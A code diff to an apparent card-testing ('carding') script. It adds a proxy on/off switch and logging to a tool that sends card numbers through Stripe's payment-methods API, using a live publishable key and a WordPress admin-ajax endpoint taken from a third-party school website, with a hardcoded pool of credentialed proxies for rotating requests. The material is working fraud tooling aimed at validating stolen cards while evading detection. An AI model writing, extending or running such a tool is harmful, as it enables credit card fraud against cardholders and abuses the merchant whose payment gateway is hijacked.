@@ -15,6 +15,9 @@ GATEWAY_URL = "https://texassouthernacademy.com/wp-admin/admin-ajax.php"
 STRIPE_PM_URL = "https://api.stripe.com/v1/payment_methods"
 PUBLIC_KEY = "pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d"
 
+# Proxy Configuration
+USE_PROXY = False  # Change to True to enable proxies
+
 # Proxy Pool
 PROXY_LIST = [
 "31.59.20.176:6754:devtronex:devtronexop",
@@ -31,6 +34,9 @@ PROXY_LIST = [
 
 def get_random_proxy():
     """Get a random proxy from the pool in requests format."""
+    if not USE_PROXY:
+        return None
+        
     proxy_str = random.choice(PROXY_LIST)
     parts = proxy_str.split(':')
     if len(parts) == 4:
@@ -82,6 +88,10 @@ def check_card():
         
         # Log parsing
         print(f"[{datetime.now()}] [{log_id}] Initiating check for {cc[:6]}******{cc[-4:]}")
+        if USE_PROXY:
+            print(f"[{datetime.now()}] [{log_id}] Proxy: ENABLED")
+        else:
+            print(f"[{datetime.now()}] [{log_id}] Proxy: DISABLED")
         
         # 2. Get BIN Info
         bin_info = get_bin_info(cc)
@@ -109,7 +119,7 @@ def check_card():
         
         print(f"[{datetime.now()}] [{log_id}] Step 1: Creating Stripe Payment Method...")
         
-        # Get random proxy
+        # Get random proxy (returns None if USE_PROXY is False)
         proxies = get_random_proxy()
         
         response1 = requests.post(STRIPE_PM_URL, headers=stripe_headers, data=stripe_payload, proxies=proxies, timeout=15)
